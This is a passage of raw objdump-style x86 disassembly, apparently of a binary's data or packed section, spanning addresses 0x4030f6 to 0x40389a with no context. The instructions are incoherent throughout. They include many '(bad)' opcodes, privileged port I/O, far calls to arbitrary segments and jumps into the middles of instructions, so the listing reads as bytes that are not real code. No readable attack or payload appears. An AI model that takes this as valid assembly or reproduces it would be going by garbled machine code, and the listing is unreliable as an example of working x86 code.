  4030f6:	and    eax,DWORD PTR [eax-0x365493d8]
  4030fc:	mov    bh,0x66
  4030fe:	popa   
  4030ff:	arpl   WORD PTR [ebx],bx
  403101:	inc    edi
  403102:	retf   0x40f0
  403105:	adc    BYTE PTR [ebx+edx*8-0x3c196e6d],0xe3
  40310d:	fidiv  WORD PTR [eax-0x6b]
  403110:	cmp    bl,BYTE PTR [ecx+eiz*8-0x415b3b7f]
  403117:	inc    esp
  403118:	aam    0xe8
  40311a:	inc    ecx
  40311b:	sahf   
  40311c:	loope  0x403126
  40311e:	aam    0xc3
  403120:	sti    
  403121:	mov    edi,0x3e7e0bcf
  403126:	pop    esp
  403127:	test   DWORD PTR [ebx-0x44],0x40b28e64
  40312e:	sbb    al,0xcf
  403130:	stc    
  403131:	fild   QWORD PTR [esp+ebp*8-0x26f2efdb]
  403138:	xor    edi,edx
  40313a:	xchg   BYTE PTR [edx+eax*2],ch
  40313d:	sub    esi,edi
  40313f:	rcr    dh,cl
  403141:	aaa    
  403142:	test   al,0xb4
  403144:	mov    bl,0xc0
  403146:	call   0x37c7:0x3c904899
  40314d:	fwait
  40314e:	inc    esp
  40314f:	pop    ebp
  403150:	nop
  403151:	ss jmp 0x4030f1
  403154:	add    al,0x36
  403156:	leave  
  403157:	jae    0x40314c
  403159:	pop    ebx
  40315a:	xor    BYTE PTR [edi-0x58],0x3b
  40315e:	mov    ch,BYTE PTR [ebx-0x1c]
  403161:	jns    0x403111
  403163:	mov    ecx,0xfbfc117b
  403168:	shl    DWORD PTR [edi+0x325aac49],1
  40316e:	mov    al,ds:0x324041e9
  403173:	out    dx,al
  403174:	test   eax,0xb1291ab4
  403179:	fistp  DWORD PTR [ebx]
  40317b:	mov    ebp,0x91f509be
  403180:	loopne 0x4031aa
  403182:	outs   dx,BYTE PTR ds:[esi]
  403183:	sbb    ecx,DWORD PTR [ebx-0x4c]
  403186:	sub    BYTE PTR [esi+0x2d],0xc5
  40318a:	lock adc ch,ch
  40318d:	pop    ds
  40318e:	out    dx,al
  40318f:	adc    bl,dl
  403191:	sub    al,0xda
  403193:	mov    ebx,0xa5b87930
  403198:	in     al,0x76
  40319a:	pop    ebx
  40319b:	ficomp WORD PTR [ebx+0x52d64ba4]
  4031a1:	dec    ebx
  4031a2:	aam    0x30
  4031a4:	lds    eax,FWORD PTR [bp+0x23]
  4031a8:	pop    edi
  4031a9:	call   0x2c2a1a4d
  4031ae:	xor    al,0x78
  4031b0:	in     eax,0x34
  4031b2:	lds    esi,FWORD PTR [eax-0x1b]
  4031b5:	call   0x93af:0x43970abb
  4031bc:	xchg   BYTE PTR [ebp-0x3c],al
  4031bf:	push   edi
  4031c0:	mov    dl,0xcf
  4031c2:	mov    WORD PTR [esi-0x3b],gs
  4031c5:	push   es
  4031c6:	lea    edx,ds:0x47db4587
  4031cc:	test   DWORD PTR [edi],ebp
  4031ce:	mov    al,ds:0x10862024
  4031d3:	xchg   edx,eax
  4031d4:	adc    al,0x1f
  4031d6:	mov    bh,0x48
  4031d8:	dec    eax
  4031d9:	popa   
  4031da:	adc    edi,edx
  4031dc:	jae    0x403178
  4031de:	mov    edi,0x91ef0fa1
  4031e3:	test   eax,0xdec3e7f7
  4031e8:	mov    ds:0xb5bfaded,al
  4031ed:	imul   ebp,edx,0x3b
  4031f0:	mov    dh,0xc9
  4031f2:	or     DWORD PTR [eax-0x32f8f105],eax
  4031f8:	std    
  4031f9:	and    cl,BYTE PTR [ebx+0x10]
  4031fc:	scas   eax,DWORD PTR es:[edi]
  4031fd:	adc    edx,DWORD PTR [edx+0x2c]
  403200:	cs jnp 0x4031e2
  403203:	adc    eax,0x97ab9a45
  403208:	cld    
  403209:	or     DWORD PTR ds:0x38a33d12,esp
  40320f:	mov    esp,0xa50c1329
  403214:	jmp    0x3051bad1
  403219:	sub    eax,0x8a78cd65
  40321e:	sub    al,0xbc
  403220:	cmp    al,0x78
  403222:	adc    al,0x67
  403224:	mov    ebp,0xdb7680fb
  403229:	cmp    DWORD PTR [ebx],ebx
  40322b:	test   ax,0x17f2
  40322f:	in     al,dx
  403230:	es out 0x12,eax
  403233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403234:	test   DWORD PTR [esi-0x53],eax
  403237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403238:	andnps xmm7,XMMWORD PTR [eax]
  40323b:	inc    eax
  40323c:	shl    BYTE PTR [esi-0x6d],0xf0
  403240:	cmp    ch,BYTE PTR [ebp+0x42bd4701]
  403246:	sahf   
  403247:	pop    ds
  403248:	fiadd  WORD PTR [eax+0x21]
  40324b:	out    dx,al
  40324c:	jl     0x40320d
  40324e:	push   cs
  40324f:	pop    esi
  403250:	jge    0x40324a
  403252:	jge    0x40324d
  403254:	cwde   
  403255:	gs js  0x4032cd
  403258:	lahf   
  403259:	neg    DWORD PTR [ecx]
  40325b:	(bad)  
  40325c:	mov    dh,0x99
  40325e:	nop
  40325f:	mov    eax,ds:0x861c67f8
  403264:	lea    esp,[edi-0x543d4de7]
  40326a:	dec    ecx
  40326b:	sbb    edx,DWORD PTR ds:0xe48fc9f6
  403271:	shr    BYTE PTR [ebx-0x2236cf0d],0xcf
  403278:	fist   DWORD PTR [ebp+0x47c34463]
  40327e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40327f:	cmp    BYTE PTR [esi],dl
  403281:	or     DWORD PTR [ecx],esp
  403283:	pop    ds
  403284:	dec    esi
  403285:	lea    ebx,[eax-0x2f]
  403288:	les    eax,FWORD PTR [ebx+0x59]
  40328b:	icebp  
  40328c:	pop    edi
  40328d:	arpl   WORD PTR [edi+0x41],bp
  403290:	aam    0x2d
  403292:	std    
  403293:	xchg   ebx,eax
  403294:	pusha  
  403295:	cmp    al,0x7f
  403297:	cmp    eax,DWORD PTR [esi]
  403299:	outs   dx,BYTE PTR ds:[esi]
  40329a:	adc    BYTE PTR [eax-0x5c],0x53
  40329e:	cli    
  40329f:	push   ss
  4032a0:	mov    ch,0xb8
  4032a2:	inc    eax
  4032a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a4:	jmp    0x4032d3
  4032a6:	test   DWORD PTR [edx*1-0x3cfa0461],edx
  4032ad:	mov    eax,ds:0x23c53f28
  4032b2:	hlt    
  4032b3:	(bad)
  4032b6:	repnz pop edx
  4032b8:	pop    ebx
  4032b9:	adc    DWORD PTR [eax-0x17],esi
  4032bc:	mov    edi,DWORD PTR [edi+ebp*8]
  4032bf:	sti    
  4032c0:	mov    ds:0xb351dcbe,eax
  4032c5:	dec    esi
  4032c6:	jne    0x40326b
  4032c8:	xchg   ecx,eax
  4032c9:	or     ebp,edi
  4032cb:	xchg   DWORD PTR [edi+0xb236547],ebp
  4032d1:	cli    
  4032d2:	and    dl,BYTE PTR [edi-0x5048b429]
  4032d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032d9:	into   
  4032da:	mov    cl,0xa4
  4032dc:	jmp    0x4a987e98
  4032e1:	arpl   dx,si
  4032e3:	cmp    ebp,eax
  4032e5:	das    
  4032e6:	fistp  DWORD PTR [ecx]
  4032e8:	dec    esp
  4032e9:	jle    0x403278
  4032eb:	push   es
  4032ec:	push   edx
  4032ed:	inc    esi
  4032ee:	push   esi
  4032ef:	sub    BYTE PTR [ebx+0x7f],dl
  4032f2:	xlat   BYTE PTR ds:[ebx]
  4032f3:	enter  0xdd7,0xd3
  4032f7:	jbe    0x403361
  4032f9:	cmp    cl,BYTE PTR [ebp+0x7a3bd826]
  4032ff:	loope  0x403331
  403301:	aaa    
  403302:	mov    ch,0x53
  403304:	or     eax,0x71ba39a
  403309:	jne    0x403310
  40330b:	loopne 0x403296
  40330d:	mov    WORD PTR [edx],cs
  40330f:	not    DWORD PTR [edx]
  403311:	sahf   
  403312:	mov    dl,0xb
  403314:	in     al,0x73
  403316:	xchg   esp,eax
  403317:	sub    DWORD PTR [esi-0x752725b],edi
  40331d:	aas    
  40331e:	popa   
  40331f:	dec    eax
  403320:	fs cmp al,0xef
  403323:	mov    ch,0x78
  403325:	cmp    al,0x24
  403327:	push   ds
  403328:	dec    ecx
  403329:	sbb    dl,BYTE PTR [edx]
  40332b:	pop    eax
  40332c:	hlt    
  40332d:	(bad)  
  40332e:	fstp   QWORD PTR [si]
  403331:	sahf   
  403332:	sub    eax,0x55b1e328
  403337:	imul   eax,DWORD PTR [ecx+0x66],0xfffffffa
  40333b:	retf   
  40333c:	int    0x58
  40333e:	push   ss
  40333f:	out    dx,al
  403340:	loop   0x4032de
  403342:	les    eax,FWORD PTR [edi+0xe]
  403345:	clc    
  403346:	sub    eax,0x57b8137f
  40334b:	popf   
  40334c:	fst    DWORD PTR [eax]
  40334e:	add    edx,edx
  403350:	cs mov edx,0xe97bea0c
  403356:	mov    dh,0x16
  403358:	fimul  DWORD PTR [edi]
  40335a:	xor    edx,DWORD PTR [ecx-0x1]
  40335d:	push   edx
  40335e:	outs   dx,DWORD PTR ds:[esi]
  40335f:	mov    esi,0x3880e5d6
  403364:	es scas eax,DWORD PTR es:[edi]
  403366:	sub    DWORD PTR [ebp+0x65a22ab8],ebp
  40336c:	jns    0x4033aa
  40336e:	inc    esi
  40336f:	jne    0x403330
  403371:	outs   dx,DWORD PTR ds:[esi]
  403372:	and    DWORD PTR [esi],0x5
  403375:	sub    DWORD PTR [ebp-0x2],0xb7cd4325
  40337c:	mov    dl,dl
  40337e:	push   esp
  40337f:	iret   
  403380:	sbb    DWORD PTR [esp+ebp*8-0x42ceb327],eax
  403387:	shl    DWORD PTR [edx+0x4685b7f6],1
  40338d:	jp     0x4033d1
  40338f:	sahf   
  403390:	clc    
  403391:	jp     0x403348
  403393:	imul   BYTE PTR [ebp+ebx*8+0x10]
  403397:	hlt    
  403398:	jge    0x403379
  40339a:	ror    DWORD PTR [ebp+0xf46ba2f],cl
  4033a0:	push   ss
  4033a1:	pop    es
  4033a2:	sub    ecx,DWORD PTR [ebx]
  4033a4:	inc    eax
  4033a5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033a7:	fwait
  4033a8:	cmp    ch,BYTE PTR [edi-0x7fb0f895]
  4033ae:	or     bh,BYTE PTR [edx]
  4033b0:	mov    al,ds:0x9ab29578
  4033b5:	imul   ebx,esp,0xffffffd7
  4033b8:	(bad)  [ecx+ebp*4]
  4033bb:	leave  
  4033bc:	stos   BYTE PTR es:[edi],al
  4033bd:	fld    QWORD PTR [ebp-0x9bff4b1]
  4033c3:	sbb    al,0xe4
  4033c5:	mov    eax,ds:0xb0d3411f
  4033ca:	in     al,dx
  4033cb:	add    BYTE PTR [edx+0x3431fa82],0xa5
  4033d2:	and    bl,bh
  4033d4:	pop    ds
  4033d5:	xchg   BYTE PTR [esi+0x20],ch
  4033d8:	dec    eax
  4033d9:	dec    eax
  4033da:	and    edi,DWORD PTR [ecx+ebp*1+0x2b]
  4033de:	pop    esp
  4033df:	fild   WORD PTR [edx-0x73d4a73e]
  4033e5:	out    dx,al
  4033e6:	push   edx
  4033e7:	or     eax,0x43eb01d6
  4033ec:	add    bh,BYTE PTR [esi+edi*8-0x7d]
  4033f0:	mov    edx,0x20e422d1
  4033f5:	test   BYTE PTR [edi],ch
  4033f7:	push   eax
  4033f8:	pop    esi
  4033f9:	adc    DWORD PTR [eax],0xffffffe2
  4033fc:	sub    al,0x7c
  4033fe:	or     BYTE PTR [eax-0x3070c2f5],al
  403404:	mov    edx,0x492facfe
  403409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40340a:	pushf  
  40340b:	dec    esi
  40340c:	xor    BYTE PTR [edx],bh
  40340e:	inc    ebx
  40340f:	outs   dx,BYTE PTR ds:[esi]
  403410:	fst    DWORD PTR [eax]
  403412:	cdq    
  403413:	pop    es
  403414:	clc    
  403415:	ret    0xf3c6
  403418:	jne    0x403493
  40341a:	in     al,dx
  40341b:	nop
  40341c:	sar    BYTE PTR [esi+0x5e],cl
  40341f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403420:	adc    al,0xd2
  403422:	arpl   bx,cx
  403424:	jnp    0x4034a2
  403426:	push   0x41eb6ffe
  40342b:	adc    BYTE PTR [ebx+0x2219be5b],dl
  403431:	gs ret 
  403433:	adc    eax,ebx
  403435:	push   cs
  403436:	pop    esi
  403437:	les    eax,FWORD PTR [edx+0x708e425b]
  40343d:	xchg   esi,eax
  40343e:	in     al,dx
  40343f:	xor    BYTE PTR [edi-0x7f],0xf4
  403443:	out    dx,al
  403444:	mov    ah,0xa6
  403446:	lods   al,BYTE PTR ds:[esi]
  403447:	inc    ebx
  403448:	mov    ds:0x4d4b4211,eax
  40344d:	pop    edx
  40344e:	push   ecx
  40344f:	stos   DWORD PTR es:[edi],eax
  403450:	inc    esp
  403451:	fild   DWORD PTR [edx+ecx*8+0x19]
  403455:	retf   0x13b6
  403458:	stos   DWORD PTR es:[edi],eax
  403459:	loope  0x403495
  40345b:	inc    ebp
  40345c:	xor    cl,BYTE PTR [edx-0x50]
  40345f:	scas   al,BYTE PTR es:[edi]
  403460:	add    ebx,DWORD PTR [edx+eiz*8]
  403463:	test   BYTE PTR [ecx],cl
  403465:	imul   ebx,DWORD PTR [ecx],0x45
  403468:	out    dx,eax
  403469:	fst    QWORD PTR [ebx]
  40346b:	stos   BYTE PTR es:[edi],al
  40346c:	mov    esi,0x21509840
  403471:	add    BYTE PTR [edx],ah
  403473:	in     al,dx
  403474:	add    DWORD PTR [ecx-0x582bc2b2],ebx
  40347a:	or     bl,ah
  40347c:	in     eax,dx
  40347d:	inc    esi
  40347e:	and    al,0xbe
  403480:	out    dx,al
  403481:	fsub   QWORD PTR [ebx]
  403483:	cmp    eax,0xb0c3787c
  403488:	jl     0x403488
  40348a:	out    0x49,al
  40348c:	mov    edi,DWORD PTR [edi-0xb]
  40348f:	jb     0x4034d8
  403491:	dec    eax
  403492:	or     ebp,DWORD PTR [ebp+0x22]
  403495:	test   al,0x5e
  403497:	mov    edi,0x12bfda33
  40349c:	leave  
  40349d:	and    edi,ecx
  40349f:	push   ebx
  4034a0:	mov    eax,ds:0x97537d83
  4034a5:	or     ah,BYTE PTR [eax]
  4034a7:	jns    0x403473
  4034a9:	push   eax
  4034aa:	adc    DWORD PTR [ebx+0x422e8f6a],ecx
  4034b0:	gs xchg ebx,esp
  4034b3:	mov    cl,BYTE PTR ds:0x197f7236
  4034b9:	rcl    DWORD PTR [ebp-0x5b],1
  4034bc:	xchg   edi,eax
  4034bd:	aam    0x71
  4034bf:	mov    BYTE PTR [edi],ch
  4034c1:	scas   eax,DWORD PTR es:[edi]
  4034c2:	scas   al,BYTE PTR es:[edi]
  4034c3:	out    0x56,eax
  4034c5:	stos   BYTE PTR es:[edi],al
  4034c6:	mov    bh,BYTE PTR [ebp-0x56]
  4034c9:	retf   0x1f0f
  4034cc:	(bad)  
  4034ce:	cld    
  4034cf:	push   esp
  4034d0:	add    al,0x48
  4034d2:	sbb    al,dh
  4034d4:	fdiv   st(5),st
  4034d6:	lock stc 
  4034d8:	loopne 0x40347b
  4034da:	mov    ebp,0x9e1a6280
  4034df:	mov    al,0xc6
  4034e1:	or     eax,0xf0d6b696
  4034e6:	inc    ebp
  4034e7:	sbb    eax,0x55d29d11
  4034ec:	inc    esp
  4034ed:	mov    cl,BYTE PTR [esi+edx*8-0x4a]
  4034f1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4034f3:	dec    ebx
  4034f4:	pop    eax
  4034f5:	enter  0x7a13,0xd4
  4034f9:	shl    DWORD PTR [esi+0x22],0x54
  4034fd:	ror    BYTE PTR [edi],0xec
  403500:	mov    al,ds:0x2d89cf02
  403505:	(bad)  [edx+0x69]
  403508:	jg     0x403557
  40350a:	fcomp  QWORD PTR [edi+0xe]
  40350d:	imul   eax,DWORD PTR [esi+0x40],0x9439e3dd
  403514:	push   eax
  403515:	pop    eax
  403516:	push   es
  403517:	fisubr WORD PTR [esi]
  403519:	shl    BYTE PTR [esi-0x74],0x1b
  40351d:	sub    eax,0xcf419682
  403522:	inc    edx
  403523:	loop   0x4034bb
  403525:	call   0xb96f:0xc0b2aabb
  40352c:	dec    edx
  40352d:	xor    eax,0x69dff8c2
  403532:	push   es
  403533:	stos   BYTE PTR es:[edi],al
  403534:	pop    es
  403535:	cmp    esp,DWORD PTR [edx-0x50324a0c]
  40353b:	mov    esp,0x14d4d354
  403540:	push   0xc01ad086
  403545:	pop    ebp
  403546:	dec    esi
  403547:	adc    al,0x4f
  403549:	cmp    eax,ebx
  40354b:	lea    edx,[edx]
  40354d:	and    eax,0x8583cd6d
  403552:	and    DWORD PTR [ecx],edi
  403554:	xchg   ebx,eax
  403555:	xchg   BYTE PTR [ebp-0x7b3a7f23],bl
  40355b:	cld    
  40355c:	xchg   esi,eax
  40355d:	scas   eax,DWORD PTR es:[edi]
  40355e:	or     esi,DWORD PTR [edx+0x67bf948e]
  403564:	mov    eax,ds:0x98ba71ab
  403569:	lock push esp
  40356b:	xor    BYTE PTR [edi],dh
  40356d:	inc    esi
  40356e:	jmp    0x7d194860
  403573:	scas   al,BYTE PTR es:[edi]
  403574:	out    dx,al
  403575:	ret    
  403576:	ret    0x533a
  403579:	adc    ecx,eax
  40357b:	fbstp  TBYTE PTR [ecx+0x172ab241]
  403581:	jecxz  0x4035b4
  403583:	ror    esp,1
  403585:	and    ebp,DWORD PTR [ecx]
  403587:	cmp    DWORD PTR [edx+0x5c],ebx
  40358a:	push   es
  40358b:	inc    ebx
  40358c:	mov    ecx,esi
  40358e:	bound  esp,QWORD PTR [eax]
  403590:	stos   BYTE PTR es:[edi],al
  403591:	push   ebp
  403592:	xor    BYTE PTR [ecx],bh
  403594:	jl     0x4035a4
  403596:	mov    esi,?
  403598:	jl     0x40353e
  40359a:	pop    ebp
  40359b:	push   edi
  40359c:	shl    BYTE PTR [ecx],cl
  40359e:	sahf   
  40359f:	hlt    
  4035a0:	add    BYTE PTR [edx-0x5f],dl
  4035a3:	cli    
  4035a4:	push   0x69566c0a
  4035a9:	mov    edx,0x23380cd8
  4035ae:	mov    ah,0x9b
  4035b0:	nop
  4035b1:	retf   0x84b1
  4035b4:	cmp    cl,BYTE PTR [edi+ebp*1]
  4035b7:	imul   esi,DWORD PTR [ecx+0x7e],0xffffffcc
  4035bb:	xchg   ebx,eax
  4035bc:	fwait
  4035bd:	rcr    BYTE PTR [ebp+0x66],1
  4035c0:	jno    0x403587
  4035c2:	sbb    al,0x8f
  4035c4:	add    BYTE PTR [edi],bl
  4035c6:	fisttp WORD PTR ds:0xa640c601
  4035cc:	jmp    0xec00:0xaad3a0b1
  4035d3:	rcl    BYTE PTR [edx+edx*2],1
  4035d6:	fistp  QWORD PTR [ecx-0x3548d644]
  4035dc:	pop    ebp
  4035dd:	outs   dx,DWORD PTR ds:[esi]
  4035de:	ss dec ebx
  4035e0:	cmp    al,0xff
  4035e2:	sbb    eax,0x6fc9c8ee
  4035e7:	dec    eax
  4035e8:	ss in  al,dx
  4035ea:	pop    eax
  4035eb:	sbb    DWORD PTR [edi-0x65],eax
  4035ee:	or     eax,0x362f4a8d
  4035f3:	lea    edi,[esi+0x736546ad]
  4035f9:	mov    esi,0x571e9968
  4035fe:	and    dl,ah
  403600:	ins    BYTE PTR es:[edi],dx
  403601:	pop    esp
  403602:	add    BYTE PTR [ecx-0x34],al
  403605:	mov    DWORD PTR [esi+eax*4-0x7a4ab199],esp
  40360c:	mov    ch,0x4c
  40360e:	jmp    0xa78e:0x583c61f7
  403615:	dec    ebx
  403616:	mov    eax,ds:0x7cd9180b
  40361b:	lds    eax,FWORD PTR [ebp+edi*8-0x38a4c5e3]
  403622:	cdq    
  403623:	pusha  
  403624:	jl     0x403636
  403626:	push   ecx
  403627:	stos   BYTE PTR es:[edi],al
  403628:	push   cs
  403629:	stc    
  40362a:	cmp    BYTE PTR [edi-0x39],cl
  40362d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40362e:	ror    BYTE PTR [esi],1
  403630:	mov    es,WORD PTR [edi+0x8]
  403633:	dec    DWORD PTR [ebx]
  403635:	fdiv   DWORD PTR [esp+eiz*2]
  403638:	jns    0x403694
  40363a:	mov    ss,WORD PTR [edx-0x7f]
  40363d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40363e:	inc    ecx
  40363f:	pop    edi
  403640:	jno    0x40366a
  403642:	adc    cl,BYTE PTR ds:0x4740bd8c
  403648:	ret    0x7a8
  40364b:	push   0x61
  40364d:	dec    eax
  40364e:	xor    al,0x15
  403650:	fucom  st(4)
  403652:	mov    DWORD PTR [edx+ecx*8+0x2e],ecx
  403656:	retf   
  403657:	jae    0x4036d6
  403659:	pop    edi
  40365a:	dec    esi
  40365b:	inc    edx
  40365c:	mov    ah,0xf7
  40365e:	sbb    bh,dl
  403660:	in     eax,dx
  403661:	push   edi
  403662:	sub    eax,0x6eda0b91
  403667:	les    ecx,FWORD PTR [ecx+0x22]
  40366a:	push   0xffffffc6
  40366c:	mov    dl,BYTE PTR [edx-0x2d]
  40366f:	mov    al,0x28
  403671:	mov    esp,0x8670d3bc
  403676:	popf   
  403677:	xor    al,0x22
  403679:	mov    cl,0x38
  40367b:	xchg   ebp,eax
  40367c:	push   ss
  40367d:	jmp    0xae40ef5e
  403682:	call   DWORD PTR [ebx+0x11]
  403685:	fs dec ecx
  403687:	rcl    BYTE PTR [eax],cl
  403689:	inc    edx
  40368a:	push   esi
  40368b:	mov    ds:0xfa163689,al
  403690:	mov    DWORD PTR [ebx],0x81785c53
  403696:	cmp    eax,0x907832e0
  40369b:	fst    QWORD PTR [ebx]
  40369d:	addr16 mov ebx,esp
  4036a0:	aaa    
  4036a1:	dec    edi
  4036a2:	aaa    
  4036a3:	mov    cl,BYTE PTR [ebx+0x42f12ba5]
  4036a9:	popf   
  4036aa:	xchg   BYTE PTR [eax-0x4d],bh
  4036ad:	(bad)  [edx+ebp*8+0x28]
  4036b1:	fmul   QWORD PTR [edx]
  4036b3:	jl     0x4036dd
  4036b5:	rcr    BYTE PTR [eax+0x31],cl
  4036b8:	push   0xffffffc9
  4036ba:	dec    ebp
  4036bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036bc:	mov    eax,DWORD PTR [ebx-0xa0983b]
  4036c2:	ja     0x40365d
  4036c4:	dec    esp
  4036c5:	daa    
  4036c6:	dec    ebp
  4036c7:	xor    eax,0xa563c2e4
  4036cc:	pop    ecx
  4036cd:	mov    ds:0x718240a,eax
  4036d2:	mov    ebp,0xdcb44d7e
  4036d7:	std    
  4036d8:	push   eax
  4036d9:	mov    ecx,0xa65ebc0f
  4036de:	(bad)
  4036e1:	dec    ebx
  4036e2:	les    edx,FWORD PTR [ecx]
  4036e4:	repnz inc esp
  4036e6:	aad    0xa1
  4036e8:	xor    DWORD PTR [ebx+0x4d],0x435c6f7e
  4036ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036f0:	jo     0x403700
  4036f2:	push   ebp
  4036f3:	push   esp
  4036f4:	(bad)
  4036f7:	cmp    al,0xd0
  4036f9:	sub    al,0xde
  4036fb:	and    eax,0x2a54d60b
  403700:	and    eax,0x4ef63213
  403705:	sbb    eax,0xa45235f4
  40370a:	add    edx,edi
  40370c:	jle    0x4036de
  40370e:	jo     0x4036a4
  403710:	stc    
  403711:	jecxz  0x403790
  403713:	sub    al,0x97
  403715:	cmp    DWORD PTR ds:0x46f854f2,edx
  40371b:	jae    0x403759
  40371d:	jmp    0xbfbdd5ed
  403722:	push   0xffffffcf
  403724:	jb     0x403706
  403726:	mov    ss,esi
  403728:	add    BYTE PTR [ecx-0x69ad93ef],dl
  40372e:	adc    eax,0xa99a8631
  403733:	sub    bl,BYTE PTR [ecx+0x78036772]
  403739:	dec    ecx
  40373a:	push   cs
  40373b:	dec    ebx
  40373c:	shl    BYTE PTR [esi+0x64],0x45
  403740:	test   al,0x31
  403742:	inc    eax
  403743:	jle    0x4036e7
  403745:	rcl    BYTE PTR [edx],0x5f
  403748:	fdivp  st(1),st
  40374a:	sbb    dl,ah
  40374c:	repnz sahf 
  40374e:	dec    esp
  40374f:	jne    0x4037c2
  403751:	ins    BYTE PTR es:[edi],dx
  403752:	scas   al,BYTE PTR es:[edi]
  403753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403754:	in     eax,dx
  403755:	retf   
  403756:	fadd   st,st(2)
  403758:	sbb    cl,BYTE PTR [ecx]
  40375a:	(bad)  
  40375b:	pop    ds
  40375c:	out    dx,eax
  40375d:	lea    ebx,[ecx-0x2]
  403760:	or     BYTE PTR [edx-0x3c06a60e],0x24
  403767:	aad    0x44
  403769:	out    dx,eax
  40376a:	inc    ebp
  40376b:	jle    0x403788
  40376d:	sbb    ecx,esp
  40376f:	pop    edi
  403770:	sbb    eax,DWORD PTR [edx-0x4c]
  403773:	cmp    dh,BYTE PTR [ecx-0xa]
  403776:	sar    ecx,0x0
  403779:	push   es
  40377a:	fild   QWORD PTR [esi]
  40377c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40377d:	idiv   BYTE PTR [ebx]
  40377f:	(bad)  
  403780:	test   dl,0xb5
  403783:	sahf   
  403784:	scas   eax,DWORD PTR es:[edi]
  403785:	mov    eax,ds:0x269a6122
  40378a:	pop    edx
  40378b:	push   ebp
  40378c:	nop
  40378d:	loope  0x40371f
  40378f:	lahf   
  403790:	xchg   esp,eax
  403791:	into   
  403792:	sbb    eax,0x638e0576
  403797:	mov    bl,0x42
  403799:	repz cli 
  40379b:	sbb    BYTE PTR [eax],dh
  40379d:	test   eax,0x435f54b7
  4037a2:	sbb    ah,BYTE PTR [edi+0x2c4d61e8]
  4037a8:	out    0xef,al
  4037aa:	(bad)  
  4037ab:	ins    DWORD PTR es:[edi],dx
  4037ac:	add    edi,DWORD PTR [eax+0x61]
  4037af:	pop    esp
  4037b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037b1:	inc    edx
  4037b2:	sbb    eax,ebx
  4037b4:	adc    ebp,0x9e0b15c7
  4037ba:	(bad)  
  4037bb:	out    0xb3,al
  4037bd:	add    esp,DWORD PTR [esi+0x67]
  4037c0:	(bad)  
  4037c1:	outs   dx,DWORD PTR ds:[esi]
  4037c2:	pop    ebx
  4037c3:	add    al,0x20
  4037c5:	les    ecx,FWORD PTR [edi+ecx*2+0x54]
  4037c9:	mov    cl,0x49
  4037cb:	mov    esp,0x61f55c7d
  4037d0:	pop    ebx
  4037d1:	xor    bl,BYTE PTR [ecx+ebp*1-0xf]
  4037d5:	mov    eax,0x955c25bd
  4037da:	ins    BYTE PTR es:[edi],dx
  4037db:	das    
  4037dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037dd:	jno    0x403824
  4037df:	call   0xf40d4859
  4037e4:	dec    ecx
  4037e5:	jge    0x4037c2
  4037e7:	add    BYTE PTR ds:0x3be816d,ah
  4037ed:	pusha  
  4037ee:	out    0x1e,eax
  4037f0:	gs pop eax
  4037f2:	push   ds
  4037f3:	jl     0x403865
  4037f5:	call   0x5ed6:0x3dd8a270
  4037fc:	push   edx
  4037fd:	into   
  4037fe:	push   ecx
  4037ff:	rol    DWORD PTR [ebx+0x442fe2fc],0xa7
  403806:	into   
  403807:	aam    0x3
  403809:	pop    edi
  40380a:	mov    bh,0x15
  40380c:	jmp    0x3c4d184f
  403811:	out    dx,eax
  403812:	lahf   
  403813:	jp     0x4037cf
  403815:	ins    BYTE PTR es:[edi],dx
  403816:	enter  0xa591,0xc5
  40381a:	xor    ah,BYTE PTR [edi]
  40381c:	icebp  
  40381d:	pop    esp
  40381e:	jb     0x403876
  403820:	lds    ecx,FWORD PTR ss:[ebp-0x9]
  403824:	int3   
  403825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403826:	sar    DWORD PTR [edi],cl
  403828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403829:	fs xor BYTE PTR gs:[edi-0x21],bh
  40382e:	ins    DWORD PTR es:[edi],dx
  40382f:	or     eax,DWORD PTR [ebp-0xe]
  403832:	hlt    
  403833:	not    cl
  403835:	(bad)  
  403836:	push   ds
  403837:	popa   
  403838:	popf   
  403839:	inc    edi
  40383a:	sub    bh,BYTE PTR [ecx-0x5c]
  40383d:	sbb    ah,bl
  40383f:	and    DWORD PTR [ebx],esi
  403841:	int    0x94
  403843:	retf   0x6a34
  403846:	rcl    BYTE PTR [edx],0x9
  403849:	repz scas al,BYTE PTR es:[edi]
  40384b:	pop    ebp
  40384c:	out    0xf0,al
  40384e:	mov    bh,0x9b
  403850:	dec    ecx
  403851:	call   0xb709fece
  403856:	nop
  403857:	adc    DWORD PTR [esi+edx*2+0x91b00e6],esp
  40385e:	jb     0x4037e5
  403860:	xor    edx,esp
  403862:	adc    eax,0xf6b7ea20
  403867:	cli    
  403868:	je     0x403841
  40386a:	and    DWORD PTR [ebx-0x7cc2eb5b],edx
  403870:	sti    
  403871:	mul    DWORD PTR [esi]
  403873:	les    ebp,FWORD PTR [ebx-0x4e]
  403876:	ss xchg esp,eax
  403878:	shl    DWORD PTR [edi+0x31],0x7
  40387c:	xchg   edi,eax
  40387d:	push   ds
  40387e:	push   ebx
  40387f:	test   al,0xce
  403881:	jecxz  0x403870
  403883:	outs   dx,DWORD PTR ds:[esi]
  403884:	(bad)  
  403885:	call   0xc38:0x57a2d8c0
  40388c:	xchg   ebp,eax
  40388d:	out    dx,al
  40388e:	sbb    al,0xdc
  403890:	adc    al,0xdc
  403892:	pop    es
  403893:	mov    eax,ds:0x3aabb5ea
  403898:	jno    0x40387e
  40389a:	xchg   edi,eax
